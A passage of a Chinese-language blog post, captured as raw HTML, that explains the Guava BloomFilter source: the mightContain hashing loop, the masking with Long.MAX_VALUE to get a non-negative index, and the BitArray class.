class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-23\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-24\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytesInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-25\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-26\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-28\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-29\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Make the combined hash positive and indexable</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-32\"><span class=\"crayon-h\">          </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-35\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-36\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0075 seconds] -->\r\n\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><!-- [Format Time: 0.0074 seconds] --></p>\n<p>抽象来看，put是写，mightContain是读，两个方法的代码有一点相似，都是先利用murmur3 hash对输入的funnel计算得到128位的字节数组，然后高低分别取8个字节（64位）创建2个long型整数hash1，hash2作为哈希值。循环体内采用了2个函数模拟其他函数的思想，即上文提到的gi(x) = h1(x) + ih2(x) ，这相当于每次累加hash2，然后通过基于bitSize取模的方式在bit数组中索引。</p>\n<blockquote><p>这里之所以要和Long.MAX_VALUE进行按位与的操作，是因为在除数和被除数符号不一致的情况下计算所得的结果是有差别的，在程序语言里，“%”准确来说是取余运算（C，C++和Java均如此，python是取模），如-5%3=-2，而取模的数学定义是x mod y=x-y[x/y]（向下取整），所以-5 mod 3= -5-3*(-2)=1，因此当哈希值为负数的时候，其取余的结果为负（bitSize始终为正数），这样就不方便在bit数组中取值，因此通过Long.MAX_VALUE(二进制为0111…1111)，直接将开头的符号位去掉，从而转变为正数。当然也可以取绝对值，在另一个MURMUR128_MITZ_32的实现中就是这么做的。</p></blockquote>\n<p>在put方法中，先是将索引位置上的二进制置为1，然后用bitsChanged记录插入结果，如果返回true表明没有重复插入成功，而mightContain方法则是将索引位置上的数值取出，并判断是否为0，只要其中出现一个0，那么立即判断为不存在。</p>\n<p>最后再说一下底层bit数组的实现，主要代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1bd766418096\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n static final class BitArray {\r\n    final long[] data;\r\n    long bitCount;\r\n\r\n    BitArray(long bits) {\r\n      this(new long[Ints.checkedCast(LongMath.divide(bits, 64, RoundingMode.CEILING))]);\r\n    }\r\n\r\n    // Used by serialization\r\n    BitArray(long[] data) {\r\n      checkArgument(data.length &gt; 0, \"data length is zero!\");\r\n      this.data = data;\r\n      long bitCount = 0;\r\n      for (long value : data) {\r\n        bitCount += Long.bitCount(value);\r\n      }\r\n      this.bitCount = bitCount;\r\n    }\r\n\r\n    /** Returns true if the bit changed value. */\r\n    boolean set(long index) {\r\n      if (!get(index)) {\r\n        data[(int) (index &gt;&gt;&gt; 6)] |= (1L &lt;&lt; index);\r\n        bitCount++;\r\n        return true;\r\n      }\r\n      return false;\r\n    }\r\n\r\n    boolean get(long index) {\r\n      return (data[(int) (index &gt;&gt;&gt; 6)] &amp; (1L &lt;&lt; index)) != 0;\r\n    }\r\n\r\n    /** Number of bits */\r\n    long bitSize() {\r\n      return (long) data.length * Long.SIZE;\r\n    }\r\n...\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1bd766418096-39\">39</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-6\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Ints</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">checkedCast</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LongMath</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">divide</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RoundingMode</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CEILING</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Used by serialization</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"data length is zero!\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-12\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-13\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-14\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-17\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/** Returns true if the bit changed value. */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-22\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1L</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-26\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-27\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-31\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1L</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/** Number of bits */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-36\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIZE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1bd766418096-38\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1bd766418096-39\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0058 seconds] 